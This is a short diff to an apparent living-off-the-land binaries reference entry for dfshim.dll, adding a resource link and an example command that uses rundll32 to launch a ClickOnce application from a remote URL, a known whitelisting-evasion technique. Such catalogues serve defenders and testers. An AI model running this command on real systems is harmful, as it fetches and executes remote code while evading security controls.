@@ -3,7 +3,7 @@
 * Functions: Execute
 
 ```
-Missing Example
+rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
 ```
 
 Acknowledgements:
@@ -14,6 +14,7 @@ Code sample:
 
 Resources:
 * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
+* https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
 
 Full path:
 ```
